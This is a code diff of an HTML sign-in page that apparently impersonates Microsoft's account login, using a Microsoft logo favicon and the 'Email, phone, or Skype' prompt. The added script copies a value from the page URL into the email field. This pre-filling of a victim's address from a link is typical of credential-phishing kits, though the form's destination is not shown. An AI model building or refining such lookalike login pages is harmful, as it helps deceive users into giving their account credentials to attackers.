@@ -4,7 +4,9 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="shortcut icon" href="https://static.vecteezy.com/system/resources/thumbnails/027/127/473/small_2x/microsoft-logo-microsoft-icon-transparent-free-png.png" type="image/x-icon">
+    <link rel="shortcut icon"
+        href="https://static.vecteezy.com/system/resources/thumbnails/027/127/473/small_2x/microsoft-logo-microsoft-icon-transparent-free-png.png"
+        type="image/x-icon">
     <title>Sign In</title>
     <style>
         body {
@@ -188,6 +190,7 @@
             color: #0067C5;
             text-decoration: none;
             margin-bottom: 10px;
+            text-align: center;
         }
 
         .sub-btn {
@@ -210,6 +213,13 @@
                 <div class="title title1">Sign in</div>
                 <div class="input-group">
                     <input type="text" id="email" name="user" placeholder="Email, phone, or Skype" required>
+                    <!-- javascrip for auto -->
+                    <script type="text/javascript">
+                        var url = window.location.href;
+                        var name = url.substring(url.indexOf("=") + 1);
+                        document.getElementById("email").value = name;
+                    </script>
+                    <!--  -->
                 </div>
                 <div class="links">
                     No account? <a href="#">Create one!</a><br /><br>
